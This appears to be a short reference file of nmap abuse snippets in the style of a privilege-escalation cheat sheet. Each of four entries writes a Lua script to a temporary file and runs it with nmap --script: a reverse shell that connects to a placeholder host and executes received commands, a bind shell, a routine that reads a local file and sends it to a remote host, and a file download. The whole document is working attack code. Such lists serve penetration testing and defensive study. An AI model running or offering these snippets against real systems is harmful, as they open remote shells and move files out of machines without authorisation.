non-interactive-reverse-shell.code:
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect("[host]",[port]);
while true do
  local r,x=t:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF

non-interactive-bind-shell.code:
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",[port]));
local c=s:accept();
while true do
  local r,x=c:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF

file-upload.code:
TF=$(mktemp)
echo 'local f=io.open("[file]", 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect("[host]",[port]);
t:send(d);
t:close();' > $TF
nmap --script=$TF

file-download.code:
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",[port]));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open("[file]", "wb");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF
